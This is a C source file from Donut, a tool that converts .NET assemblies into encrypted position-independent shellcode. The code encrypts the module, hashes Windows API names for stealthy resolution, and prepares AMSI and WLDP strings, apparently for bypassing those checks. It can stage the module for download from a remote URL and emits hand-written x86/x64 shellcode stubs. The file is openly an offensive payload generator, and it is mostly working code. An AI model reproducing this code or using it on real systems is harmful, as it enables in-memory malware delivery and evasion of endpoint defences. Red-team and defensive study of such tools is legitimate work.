/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "donut.h"

#include "payload/payload_exe_x86.h"
#include "payload/payload_exe_x64.h"
  
#define PUT_BYTE(p, v)     { *(uint8_t *)(p) = (uint8_t) (v); p = (uint8_t*)p + 1; }
#define PUT_HWORD(p, v)    { t=v; memcpy((char*)p, (char*)&t, 2); p = (uint8_t*)p + 2; }
#define PUT_WORD(p, v)     { t=v; memcpy((char*)p, (char*)&t, 4); p = (uint8_t*)p + 4; }
#define PUT_BYTES(p, v, n) { memcpy(p, v, n); p = (uint8_t*)p + n; }
 
// these have to be in same order as structure in donut.h
static API_IMPORT api_imports[]=
{ {KERNEL32_DLL, "LoadLibraryA"},
  {KERNEL32_DLL, "LoadLibraryExA"},
  {KERNEL32_DLL, "GetProcAddress"},
  {KERNEL32_DLL, "GetModuleHandleA"},
  
  {KERNEL32_DLL, "AllocConsole"},
  {KERNEL32_DLL, "AttachConsole"},
  {KERNEL32_DLL, "GetCurrentProcessId"},
  {KERNEL32_DLL, "GetCurrentThreadId"},
  {KERNEL32_DLL, "SetConsoleCtrlHandler"},
  {KERNEL32_DLL, "GetStdHandle"},
  {KERNEL32_DLL, "SetStdHandle"},
  {KERNEL32_DLL, "CreateFileA"},
  {KERNEL32_DLL, "CreateProcessA"},
  {KERNEL32_DLL, "WaitForSingleObject"},
  
  {KERNEL32_DLL, "VirtualAlloc"},
  {KERNEL32_DLL, "VirtualFree"},
  {KERNEL32_DLL, "VirtualQuery"},
  {KERNEL32_DLL, "VirtualProtect"},
  
  {OLEAUT32_DLL, "SafeArrayCreate"},
  {OLEAUT32_DLL, "SafeArrayCreateVector"},
  {OLEAUT32_DLL, "SafeArrayPutElement"},
  {OLEAUT32_DLL, "SafeArrayDestroy"},
  {OLEAUT32_DLL, "SafeArrayGetLBound"},
  {OLEAUT32_DLL, "SafeArrayGetUBound"},
  {OLEAUT32_DLL, "SysAllocString"},
  {OLEAUT32_DLL, "SysFreeString"},
  
  {WININET_DLL,  "InternetCrackUrlA"},
  {WININET_DLL,  "InternetOpenA"},
  {WININET_DLL,  "InternetConnectA"},
  {WININET_DLL,  "InternetSetOptionA"},
  {WININET_DLL,  "InternetReadFile"},
  {WININET_DLL,  "InternetCloseHandle"},
  {WININET_DLL,  "HttpOpenRequestA"},
  {WININET_DLL,  "HttpSendRequestA"},
  {WININET_DLL,  "HttpQueryInfoA"},
  
  {MSCOREE_DLL,  "CorBindToRuntime"},
  {MSCOREE_DLL,  "CLRCreateInstance"},
  
  {SHLWAPI_DLL,  "SHGetValueA"},
  
  { NULL, NULL }
};

static GUID xCLSID_CorRuntimeHost = {
  0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static GUID xIID_ICorRuntimeHost = {
  0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static GUID xCLSID_CLRMetaHost = {
  0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};
  
static GUID xIID_ICLRMetaHost = {
  0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
  
static GUID xIID_ICLRRuntimeInfo = {
  0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};

static GUID xIID_AppDomain = {
  0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4,0x38, 0x9C, 0xF2, 0xA7, 0x13}};
  
static uint64_t utf8_to_utf16(wchar_t* dst, const char* src, uint64_t len) {
    uint16_t *out = (uint16_t*)dst;
    uint64_t   i;
    
    for(i=0; src[i] != 0 && i < len; i++) {
      out[i] = src[i];
    }
    return i;
}

static int GetModuleType(const char *file) {
    IMAGE_DOS_HEADER   dos;
    IMAGE_NT_HEADERS64 nt;
    int                fd, type = -1;
    
    DPRINT("Opening %s", file);
    fd = open(file, O_RDONLY);
    if(fd < 0) return -1;
    
    DPRINT("Reading IMAGE_DOS_HEADER");
    read(fd, &dos, sizeof(dos));
    DPRINT("Checking e_magic");
    
    if(dos.e_magic == IMAGE_DOS_SIGNATURE) {
      DPRINT("Seeking position of IMAGE_NT_HEADERS");
      lseek(fd, dos.e_lfanew, SEEK_SET);
      DPRINT("Reading IMAGE_NT_HEADERS");
      read(fd, &nt, sizeof(nt));
      DPRINT("Checking Signature");
      
      if(nt.Signature == IMAGE_NT_SIGNATURE) {
        DPRINT("Characteristics : %04lx", nt.FileHeader.Characteristics);
        if(nt.FileHeader.Characteristics & IMAGE_FILE_DLL) {
          type = DONUT_MODULE_DLL;
        } else {
          type = DONUT_MODULE_EXE;
        }
      }
    }
    close(fd);
    return type;
}

// return pointer to DOS header
PIMAGE_DOS_HEADER DosHdr(void *map) {
    return (PIMAGE_DOS_HEADER)map;
}

// return pointer to NT headers
PIMAGE_NT_HEADERS NtHdr (void *map) {
    return (PIMAGE_NT_HEADERS) ((uint8_t*)map + DosHdr(map)->e_lfanew);
}

// return pointer to File header
PIMAGE_FILE_HEADER FileHdr (void *map) {
    return &NtHdr(map)->FileHeader;
}

// determines CPU architecture of binary
int is32 (void *map) {
    return FileHdr(map)->Machine == IMAGE_FILE_MACHINE_I386;
}

// determines CPU architecture of binary
int is64 (void *map) {
    return FileHdr(map)->Machine == IMAGE_FILE_MACHINE_AMD64;
}

// return pointer to Optional header
void* OptHdr (void *map) {
    return (void*)&NtHdr(map)->OptionalHeader;
}

// return pointer to first section header
PIMAGE_SECTION_HEADER SecHdr (void *map) {
    PIMAGE_NT_HEADERS nt = NtHdr(map);
  
    return (PIMAGE_SECTION_HEADER)((uint8_t*)&nt->OptionalHeader + 
    nt->FileHeader.SizeOfOptionalHeader);
}

uint32_t SecSize (void *map) {
    return NtHdr(map)->FileHeader.NumberOfSections;
}

PIMAGE_DATA_DIRECTORY Dirs (void *map) {
    if (is32(map)) {
      return ((PIMAGE_OPTIONAL_HEADER32)OptHdr(map))->DataDirectory;
    } else {
      return ((PIMAGE_OPTIONAL_HEADER64)OptHdr(map))->DataDirectory;
    }
}

// valid dos header?
int valid_dos_hdr (void *map) {
    PIMAGE_DOS_HEADER dos = DosHdr(map);
    
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    return (dos->e_lfanew != 0);
}

// valid nt headers
int valid_nt_hdr (void *map) {
    return NtHdr(map)->Signature == IMAGE_NT_SIGNATURE;
}

uint64_t rva2ofs (void *map, uint32_t rva) {
    int i;
    
    PIMAGE_SECTION_HEADER sh = SecHdr(map);
    
    for (i=0; i<SecSize(map); i++) {
      if (rva >= sh[i].VirtualAddress && rva < sh[i].VirtualAddress + sh[i].SizeOfRawData)
      return sh[i].PointerToRawData + (rva - sh[i].VirtualAddress);
    }
    return -1;
}

// Per the ECMA spec, the section data looks like this:
typedef struct tagMDSTORAGESIGNATURE {
    ULONG       lSignature;             // "Magic" signature.
    USHORT      iMajorVer;              // Major file version.
    USHORT      iMinorVer;              // Minor file version.
    ULONG       iExtraData;             // Offset to next structure of information 
    ULONG       iVersionString;         // Length of version string
    BYTE        pVersion[0];            // Version string
} MDSTORAGESIGNATURE, *PMDSTORAGESIGNATURE;

static char *GetVersionFromFile(const char *file) {
    PIMAGE_COR20_HEADER   cor; 
    PIMAGE_DATA_DIRECTORY dir;
    DWORD                 rva;
    int                   fd;
    struct stat           fs;
    uint8_t               *base;
    PMDSTORAGESIGNATURE   pss;
    static char           version[32];
    uint64_t              ofs;
    
    // default if no version can be retrieved
    strcpy(version, "v4.0.30319");
    
    DPRINT("Opening %s", file);
    fd = open(file, O_RDONLY);
    if(fd < 0) return version;
    
    // get the size of assembly
    if(fstat(fd, &fs) == 0) {
      // map into memory
      DPRINT("Mapping %i bytes for %s", fs.st_size, file);
      base = (uint8_t*)mmap(NULL, fs.st_size,  
        PROT_READ, MAP_PRIVATE, fd, 0);
        
      if(base != NULL) {
        DPRINT("Reading IMAGE_COR20_HEADER");
        dir = Dirs(base);
        rva = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress;
        DPRINT("RVA : %08lx", rva);
        
        if(rva != 0) {
          ofs = rva2ofs(base, rva);
          if (ofs != -1) {
            cor = (PIMAGE_COR20_HEADER)(ofs + (uint64_t*)base);
            DPRINT("PIMAGE_COR20_HEADER : %p", cor);
            rva = cor->MetaData.VirtualAddress;
            DPRINT("RVA : %08lx", rva);
            if(rva != 0) {
              ofs = rva2ofs(base, rva);
              if(ofs != -1) {
                pss = (PMDSTORAGESIGNATURE)(ofs + (uint64_t*)base);
               strncpy(version, (char*)pss->pVersion, sizeof(version) - 1);
             }
           }
         }
        }
        munmap(base, fs.st_size);
      }
    }
    DPRINT("Version : %s", version);
    DPRINT("Closing %s", file);
    close(fd);
    
    return version;
}

// Tries to determine if assembly is valid
// Using simple checks..
int IsValidAssembly(const char *path) {
    int                   fd, valid = 0;
    struct stat           fs;
    PIMAGE_COR20_HEADER   cor; 
    PIMAGE_DATA_DIRECTORY dir;
    DWORD                 rva, len;
    uint64_t              ofs;
    uint8_t               *base;
    
    DPRINT("Opening %s", path);
    fd = open(path, O_RDONLY);
    if(fd < 0) return 0;
    
    // get the size of assembly
    if(fstat(fd, &fs) == 0) {
      // map into memory
      DPRINT("Mapping %i bytes for %s", fs.st_size, path);
      base = (uint8_t*)mmap(NULL, fs.st_size,  
        PROT_READ, MAP_PRIVATE, fd, 0);
        
      if(base != NULL) {
        DPRINT("Checking DOS header");
        if(valid_dos_hdr(base)) {
          DPRINT("Checking NT header");
          if(valid_nt_hdr(base)) {
            DPRINT("Checking COM directory");
            dir = Dirs(base);
            if(dir != NULL) {
              rva = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress;
              len = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size;
              ofs = rva2ofs(base, rva);
              DPRINT("RVA2OFS(%08lx, %016llx)", rva, ofs);
              
              if(ofs != -1) {
                cor = (PIMAGE_COR20_HEADER)(ofs + (uint64_t*)base);
                valid = (rva != 0 && len != 0 && cor != NULL);
              }
            }
          }
        }
        DPRINT("Unmapping");
        munmap(base, fs.st_size);
      }
    }
    DPRINT("Closing %s", path);
    DPRINT("%s is valid assembly : %s", 
      path, valid ? "TRUE" : "FALSE");
    close(fd);
    return valid;
}

// returns 1 on success else <=0
static int CreateRandom(void *buf, uint64_t len) {
    
#if defined(WINDOWS)
    HCRYPTPROV prov;
    int        ok;
    
    // 1. acquire crypto context
    if(!CryptAcquireContext(
        &prov, NULL, NULL,
        PROV_RSA_AES,
        CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) return 0;

    ok = (int)CryptGenRandom(prov, (DWORD)len, buf);
    CryptReleaseContext(prov, 0);
    
    return ok;
#else
    int      fd;
    uint64_t   r=0;
    uint8_t *p=(uint8_t*)buf;
    
    DPRINT("Opening /dev/urandom to acquire %li bytes", len);
    fd = open("/dev/urandom", O_RDONLY);
    
    if(fd > 0) {
      for(r=0; r<len; r++, p++) {
        if(read(fd, p, 1) != 1) break;
      }
      close(fd);
    }
    DPRINT("Acquired %li of %li bytes requested", r, len);
    return r == len;
#endif
}

// Generate a random string, not exceeding DONUT_MAX_NAME bytes
// tbl is from https://stackoverflow.com/a/27459196
static int GenRandomString(void *output, uint64_t len) {
    uint8_t rnd[DONUT_MAX_NAME];
    int     i;
    char    tbl[]="HMN34P67R9TWCXYF"; 
    char    *str = (char*)output;
    
    if(len == 0 || len > (DONUT_MAX_NAME - 1)) return 0;
    
    // generate DONUT_MAX_NAME random bytes
    if(!CreateRandom(rnd, DONUT_MAX_NAME)) return 0;
    
    // generate a string using unambiguous characters
    for(i=0; i<len; i++) {
      str[i] = tbl[rnd[i] % (sizeof(tbl) - 1)];
    }
    str[i]=0;
    return 1;
}

static int CreateModule(PDONUT_CONFIG c) {
    struct stat   fs;
    FILE          *fd;
    PDONUT_MODULE mod = NULL;
    uint64_t        len = 0;
    char          *param, parambuf[DONUT_MAX_NAME*DONUT_MAX_PARAM];
    int           cnt, err=DONUT_ERROR_SUCCESS;
    
    // Assembly is inaccessibe? exit
    DPRINT("stat(%s)", c->file);
    if(stat(c->file, &fs) != 0) return DONUT_ERROR_ASSEMBLY_NOT_FOUND;

    // Zero file size? exit
    if(fs.st_size == 0) return DONUT_ERROR_ASSEMBLY_EMPTY;

    // Open assembly
    DPRINT("Opening %s...", c->file);
    fd = fopen(c->file, "rb");

    // Not opened? return
    if(fd == NULL) return DONUT_ERROR_ASSEMBLY_ACCESS;

    // Allocate memory for module information and assembly
    len = sizeof(DONUT_MODULE) + fs.st_size;
    DPRINT("Allocating %" PRIi64 " bytes of memory for DONUT_MODULE", len);
    mod = calloc(len, sizeof(uint8_t));

    // If memory allocated
    if(mod != NULL) {
      // Set the type
      mod->type = c->mod_type;
      
      // If no domain name specified, generate a random string for it
      if(c->domain[0] == 0) {
        if(!GenRandomString(c->domain, 8)) {
          return DONUT_ERROR_RANDOM;
        }
      }
    
      DPRINT("Domain  : %s", c->domain);
      utf8_to_utf16((wchar_t*)mod->domain,  c->domain, strlen(c->domain));
      
      // If assembly is DLL, we expect a class and method from user
      if(mod->type == DONUT_MODULE_DLL) {
        DPRINT("Class   : %s", c->cls);
        utf8_to_utf16((wchar_t*)mod->cls,     c->cls,    strlen(c->cls));
      
        DPRINT("Method  : %s", c->method);
        utf8_to_utf16((wchar_t*)mod->method,  c->method, strlen(c->method));
      }
      
      // If no runtime specified, use from meta header
      if(c->runtime[0] == 0) {
        strncpy(c->runtime, GetVersionFromFile(c->file), DONUT_MAX_NAME - 1);
      }
      DPRINT("Runtime : %s", c->runtime);
      utf8_to_utf16((wchar_t*)mod->runtime, c->runtime, strlen(c->runtime));

      // if parameters specified
      if(c->param != NULL) {
        strncpy(parambuf, c->param, sizeof(parambuf)-1);
        cnt = 0;
        // split by comma or semi-colon
        param = strtok(parambuf, ",;");
        
        while(param != NULL && cnt < DONUT_MAX_PARAM) {
          if(strlen(param) >= DONUT_MAX_NAME) {
            DPRINT("Parameter(%s) exceeds DONUT_MAX_PARAM(%i)", 
              param, DONUT_MAX_NAME);
            err = DONUT_ERROR_INVALID_PARAMETER;
            break;
          }
          DPRINT("Adding \"%s\"", param);
          // convert ansi string to wide character string
          utf8_to_utf16((wchar_t*)mod->param[cnt++], param, strlen(param));
          // get next parameter
          param = strtok(NULL, ",;");
        }
        // set number of parameters
        mod->param_cnt = cnt;
      }
      if(err == DONUT_ERROR_SUCCESS) {
        // set length of assembly
        mod->len = fs.st_size;
        // read assembly into memory
        fread(&mod->data, 1, fs.st_size, fd);
        // update configuration with pointer to module
        c->mod     = mod;
        c->mod_len = len;
      }
    } else err = DONUT_ERROR_NO_MEMORY;
    // close assembly
    fclose(fd);
    
    if(err != DONUT_ERROR_SUCCESS && mod != NULL) {
      free(mod);
    }
    return err;
}

static int CreateInstance(PDONUT_CONFIG c) {
    DONUT_CRYPT     inst_key, mod_key;
    PDONUT_INSTANCE inst = NULL;
    uint64_t          url_len, inst_len = 0;
    uint64_t        dll_hash=0, iv=0;
    int             cnt, slash=0;
    char            sig[DONUT_MAX_NAME];
    
    // no configuration or module? exit
    DPRINT("Checking configuration");
    if(c == NULL || c->mod == NULL) {
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    // if this is URL instance, ensure url paramter and module name
    // don't exceed DONUT_MAX_URL
    if(c->inst_type == DONUT_INSTANCE_URL) {
      url_len = strlen(c->url);
      
      // if the end of string doesn't have a forward slash
      // add one more to account for it
      if(c->url[url_len - 1] != '/') slash++;
      
      if((url_len + DONUT_MAX_MODNAME + 1) > DONUT_MAX_URL) {
        return DONUT_ERROR_URL_LENGTH;
      }
    }
    DPRINT("Generating random IV for Maru hash");
    if(!CreateRandom(&iv, MARU_IV_LEN)) {
      return DONUT_ERROR_RANDOM;
    }
#if !defined(NOCRYPTO)
    DPRINT("Generating random key for encrypting instance");
    if(!CreateRandom(&inst_key, sizeof(DONUT_CRYPT))) {
      return DONUT_ERROR_RANDOM;
    }
    DPRINT("Generating random key for encrypting module");
    if(!CreateRandom(&mod_key, sizeof(DONUT_CRYPT))) {
      return DONUT_ERROR_RANDOM;
    }
    if(!GenRandomString(sig, 8)) {
      return DONUT_ERROR_RANDOM;
    }
    DPRINT("Generated random string for signature : %s", sig);
#endif
    // if this is a URL instance, generate a random name for module
    // that will be saved to disk
    if(c->inst_type == DONUT_INSTANCE_URL) {
      if(!GenRandomString(c->modname, DONUT_MAX_MODNAME)) {
        return DONUT_ERROR_RANDOM;
      }
      DPRINT("Generated random name for module : %s", c->modname);
    }
    // calculate the size of instance based on the type
    DPRINT("Allocating space for instance");
    
    inst_len = sizeof(DONUT_INSTANCE);
    
    // if this is a PIC instance, add the size of module
    // which will be appended to the end of structure
    if(c->inst_type == DONUT_INSTANCE_PIC) {
      DPRINT("The size of module is %" PRIi64 " bytes. " 
             "Adding to size of instance.", c->mod_len);
      inst_len += c->mod_len;
    }
    // allocate memory
    inst = (PDONUT_INSTANCE)calloc(inst_len, 1);
    
    // if we failed? return
    if(inst == NULL) return DONUT_ERROR_NO_MEMORY;
    
#if !defined(NOCRYPTO)
    DPRINT("Setting the decryption key for instance");
    memcpy(&inst->key, &inst_key, sizeof(DONUT_CRYPT));
    
    DPRINT("Setting the decryption key for module");
    memcpy(&inst->mod_key, &mod_key, sizeof(DONUT_CRYPT));
#endif
   
    DPRINT("Copying GUID structures to instance");
    memcpy(&inst->xIID_AppDomain,        &xIID_AppDomain,        sizeof(GUID));
    memcpy(&inst->xIID_ICLRMetaHost,     &xIID_ICLRMetaHost,     sizeof(GUID));
    memcpy(&inst->xCLSID_CLRMetaHost,    &xCLSID_CLRMetaHost,    sizeof(GUID));
    memcpy(&inst->xIID_ICLRRuntimeInfo,  &xIID_ICLRRuntimeInfo,  sizeof(GUID));
    memcpy(&inst->xIID_ICorRuntimeHost,  &xIID_ICorRuntimeHost,  sizeof(GUID));
    memcpy(&inst->xCLSID_CorRuntimeHost, &xCLSID_CorRuntimeHost, sizeof(GUID));

    strcpy(inst->amsi.s,    "AMSI");
    strcpy(inst->amsiInit,  "AmsiInitialize");
    strcpy(inst->amsiScan,  "AmsiScanBuffer");
    
    strcpy(inst->clr,       "CLR");
    
    strcpy(inst->wldp,      "WLDP");
    strcpy(inst->wldpQuery, "WldpQueryDynamicCodeTrust");
    
    strcpy(inst->subkey,    "SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full");
    strcpy(inst->value,     "Release");

    DPRINT("Copying DLL strings to instance");
    inst->dll_cnt = 4;
    
    strcpy(inst->dll_name[0], "mscoree.dll");
    strcpy(inst->dll_name[1], "oleaut32.dll");
    strcpy(inst->dll_name[2], "wininet.dll");
    strcpy(inst->dll_name[3], "shlwapi.dll");

    DPRINT("Generating hashes for API using IV: %" PRIx64, iv);
    inst->iv = iv;
    
    for(cnt=0; api_imports[cnt].module != NULL; cnt++) {
      // calculate hash for DLL string
      dll_hash = maru(api_imports[cnt].module, iv);
      
      // calculate hash for API string.
      // xor with DLL hash and store in instance
      inst->api.hash[cnt] = maru(api_imports[cnt].name, iv) ^ dll_hash;
      
      DPRINT("Hash for %-15s : %-22s = %" PRIX64, 
        api_imports[cnt].module, 
        api_imports[cnt].name,
        inst->api.hash[cnt]);
    }
    // set how many addresses to resolve
    inst->api_cnt = cnt;

    // set the type of instance we're creating
    inst->type = c->inst_type;

    // if the module will be downloaded
    // set the URL parameter and request verb
    if(inst->type == DONUT_INSTANCE_URL) {
      DPRINT("Setting URL parameters");
      
      strcpy(inst->http.url, c->url);
      if(slash) strcat(inst->http.url, "/");
      if(slash) strcat(c->url, "/");
      // append module name
      strcat(inst->http.url, c->modname);
      // set the request verb
      strcpy(inst->http.req, "GET");
      
      DPRINT("Payload will attempt download from : %s", 
        inst->http.url);
    }

    inst->mod_len = c->mod_len;
    inst->len     = inst_len;
    c->inst       = inst;
    c->inst_len   = inst_len;
    
    strcpy((char*)inst->sig, sig);
    
#if !defined(NOCRYPTO)
    if(c->inst_type == DONUT_INSTANCE_URL) {
      DPRINT("encrypting module for download");
      
      c->mod->mac = maru(inst->sig, inst->iv);
      
      donut_encrypt(
        mod_key.mk, 
        mod_key.ctr, 
        c->mod, 
        c->mod_len);
    }
#endif
    // if PIC, copy module to instance
    if(inst->type == DONUT_INSTANCE_PIC) {
      DPRINT("Copying module data to instance");
      memcpy(&c->inst->module.x, c->mod, c->mod_len);
    }
    
#if !defined(NOCRYPTO)
    DPRINT("encrypting instance");
    
    inst->mac = maru(inst->sig, inst->iv);
    
    uint32_t ofs = sizeof(uint32_t) + sizeof(DONUT_CRYPT);
    uint8_t *inst_data = (uint8_t*)inst + ofs;
    
    donut_encrypt(
      inst_key.mk, 
      inst_key.ctr, 
      inst_data, 
      c->inst_len - ofs);
#endif
    return DONUT_ERROR_SUCCESS;
}
  
// given a configuration, create a PIC that will run from anywhere in memory
EXPORT_FUNC int DonutCreate(PDONUT_CONFIG c) {
    uint8_t  *pl;
    uint32_t t;
    int      err = DONUT_ERROR_SUCCESS;
    FILE     *fd;
    
    DPRINT("Validating configuration and path of assembly");
    if(c == NULL || c->file == NULL) {
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    
    c->mod      = NULL;
    c->mod_len  = 0;
    
    c->inst     = NULL;
    c->inst_len = 0;
    
    c->pic      = NULL;
    c->pic_len  = 0;
    
    // Valid assembly?
    DPRINT("Validating assembly");
    if(!IsValidAssembly(c->file)) return DONUT_ERROR_ASSEMBLY_INVALID;
    
    DPRINT("Validating instance type");
    if(c->inst_type != DONUT_INSTANCE_PIC &&
       c->inst_type != DONUT_INSTANCE_URL) {
         
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    
    if(c->inst_type == DONUT_INSTANCE_URL) {
      DPRINT("Validating URL");
      if(c->url[0] == 0) return DONUT_ERROR_INVALID_PARAMETER;
      
      if((strnicmp(c->url, "http://",  7) != 0) &&
         (strnicmp(c->url, "https://", 8) != 0)) {
           
        return DONUT_ERROR_INVALID_URL;
      }
      if(strlen(c->url) < 8) return DONUT_ERROR_INVALID_URL;
    }
    
    // get runtime version
    GetVersionFromFile(c->file);
    
    DPRINT("Getting type of module");
    c->mod_type = GetModuleType(c->file);
    if(c->mod_type < 0) return DONUT_ERROR_ASSEMBLY_INVALID;
    
    DPRINT("Validating module type");
    if(c->mod_type != DONUT_MODULE_DLL &&
       c->mod_type != DONUT_MODULE_EXE) {
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    if(c->mod_type == DONUT_MODULE_DLL) {
      DPRINT("Validating class and method for DLL");
      if(c->cls == NULL || c->method == NULL) {
        return DONUT_ERROR_ASSEMBLY_PARAMS;
      }
    }
    DPRINT("Checking architecture");
    if(c->arch != DONUT_ARCH_X86 &&
       c->arch != DONUT_ARCH_X64 &&
       c->arch != DONUT_ARCH_X84)
    {
      return DONUT_ERROR_INVALID_ARCH;
    }
    
    // 1. create the module
    DPRINT("Creating module");
    err = CreateModule(c);
    if(err == DONUT_ERROR_SUCCESS) {
      // 2. create the instance
      DPRINT("Creating instance");
      err = CreateInstance(c);
      if(err == DONUT_ERROR_SUCCESS) {
        // if DEBUG is defined, save instance to disk
        #ifdef DEBUG
          DPRINT("Saving instance to file");
          fd = fopen("instance", "wb");
          
          if(fd != NULL) {
            fwrite(c->inst, 1, c->inst_len, fd);
            fclose(fd);
          }
        #endif
        // 3. if this module will be stored on a remote server
        if(c->inst_type == DONUT_INSTANCE_URL) {
          DPRINT("Saving %s to disk.", c->modname);
          // save the module to disk using random name
          fd = fopen(c->modname, "wb");
          
          if(fd != NULL) {
            fwrite(c->mod, 1, c->mod_len, fd);
            fclose(fd);
          }
        }
        // 4. calculate size of PIC + instance combined
        if(c->arch == DONUT_ARCH_X86) {
          c->pic_len = sizeof(PAYLOAD_EXE_X86) + c->inst_len + 32;
        } else if(c->arch == DONUT_ARCH_X64) {
          c->pic_len = sizeof(PAYLOAD_EXE_X64) + c->inst_len + 32;
        } else if(c->arch == DONUT_ARCH_X84) {
          c->pic_len = sizeof(PAYLOAD_EXE_X86) + 
                       sizeof(PAYLOAD_EXE_X64) + c->inst_len + 32;
        }
        // 5. allocate memory for shellcode
        c->pic = malloc(c->pic_len);
        
        DPRINT("PIC size : %" PRIi64, c->pic_len);
        
        if(c->pic != NULL) {
          DPRINT("Inserting opcodes");
          // 6. insert shellcode
          pl = (uint8_t*)c->pic;
          // call $ + c->inst_len
          PUT_BYTE(pl,  0xE8);
          PUT_WORD(pl,  c->inst_len);
          PUT_BYTES(pl, c->inst, c->inst_len);
          // pop ecx
          PUT_BYTE(pl,  0x59);
          
          if(c->arch == DONUT_ARCH_X86) {
            // pop edx
            PUT_BYTE(pl, 0x5A);
            // push ecx
            PUT_BYTE(pl, 0x51);
            // push edx
            PUT_BYTE(pl, 0x52);
            DPRINT("Copying %" PRIi64 " bytes of x86 shellcode", 
              (uint64_t)sizeof(PAYLOAD_EXE_X86));
              
            PUT_BYTES(pl, PAYLOAD_EXE_X86, sizeof(PAYLOAD_EXE_X86));
          } else if(c->arch == DONUT_ARCH_X64) {
            DPRINT("Copying %" PRIi64 " bytes of amd64 shellcode", 
              (uint64_t)sizeof(PAYLOAD_EXE_X64));
              
            PUT_BYTES(pl, PAYLOAD_EXE_X64, sizeof(PAYLOAD_EXE_X64));
          } else if(c->arch == DONUT_ARCH_X84) {
            DPRINT("Copying %" PRIi64 " bytes of x86 + amd64 shellcode",
              (uint64_t)(sizeof(PAYLOAD_EXE_X86) + sizeof(PAYLOAD_EXE_X64)));
              
            // xor eax, eax
            PUT_BYTE(pl,  0x31);
            PUT_BYTE(pl,  0xC0);
            // dec eax
            PUT_BYTE(pl,  0x48);
            // js dword x86_code
            PUT_BYTE(pl,  0x0F);
            PUT_BYTE(pl,  0x88);
            PUT_WORD(pl,  sizeof(PAYLOAD_EXE_X64));
            PUT_BYTES(pl, PAYLOAD_EXE_X64, sizeof(PAYLOAD_EXE_X64));
            // pop edx
            PUT_BYTE(pl, 0x5A);
            // push ecx
            PUT_BYTE(pl, 0x51);
            // push edx
            PUT_BYTE(pl, 0x52);
            PUT_BYTES(pl, PAYLOAD_EXE_X86, sizeof(PAYLOAD_EXE_X86));
          }
          err = DONUT_ERROR_SUCCESS;
        } else err = DONUT_ERROR_NO_MEMORY;
      }
    }
    if(err != DONUT_ERROR_SUCCESS) {
      DonutDelete(c);
    }
    return err;
}

EXPORT_FUNC int DonutDelete(PDONUT_CONFIG c) {
    
    if(c == NULL) {
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    // free module
    if(c->mod != NULL) {
      free(c->mod);
      c->mod = NULL;
    }
    // free instance
    if(c->inst != NULL) {
      free(c->inst);
      c->inst = NULL;
    }
    // free payload
    if(c->pic != NULL) {
      free(c->pic);
      c->pic = NULL;
    }
    return DONUT_ERROR_SUCCESS;
}

// define when building an executable
#ifdef DONUT_EXE

const char *err2str(int err) {
    static const char *str="N/A";
    
    switch(err) {
      case DONUT_ERROR_SUCCESS:
        str = "No error";
        break;
      case DONUT_ERROR_ASSEMBLY_NOT_FOUND:
        str = "Assembly not found";
        break;
      case DONUT_ERROR_ASSEMBLY_EMPTY:
        str = "Assembly is empty";
        break;
      case DONUT_ERROR_ASSEMBLY_ACCESS:
        str = "Cannot open assembly";
        break;
      case DONUT_ERROR_ASSEMBLY_INVALID:
        str = "Assembly is invalid";
        break;      
      case DONUT_ERROR_ASSEMBLY_PARAMS:
        str = "Assembly is a DLL. Requires class and method";
        break;
      case DONUT_ERROR_NO_MEMORY:
        str = "No memory available";
        break;
      case DONUT_ERROR_INVALID_ARCH:
        str = "Invalid architecture specified";
        break;      
      case DONUT_ERROR_INVALID_URL:
        str = "Invalid URL";
        break;
      case DONUT_ERROR_URL_LENGTH:
        str = "Invalid URL length";
        break;
      case DONUT_ERROR_INVALID_PARAMETER:
        str = "Invalid parameter";
        break;
      case DONUT_ERROR_RANDOM:
        str = "Error generating random values";
        break;
    }
